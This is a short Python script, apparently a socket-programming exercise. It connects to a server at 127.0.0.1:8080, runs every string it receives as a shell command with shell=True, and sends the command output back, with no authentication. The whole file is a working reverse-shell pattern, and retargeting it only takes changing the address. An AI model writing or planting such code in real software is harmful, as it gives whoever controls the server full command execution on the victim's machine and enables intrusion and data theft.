import socket
import subprocess

sk = socket.socket()
sk.connect(('127.0.0.1', 8080))

while True:
    cmd = sk.recv(1024).decode('utf-8')
    ret = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    std_out = 'stdout: '+(ret.stdout.read()).decode('gbk')
    std_err = 'stderr: '+(ret.stderr.read()).decode('gbk')
    sk.send(std_out.encode('utf-8'))
    sk.send(std_err.encode('utf-8'))
sk.close()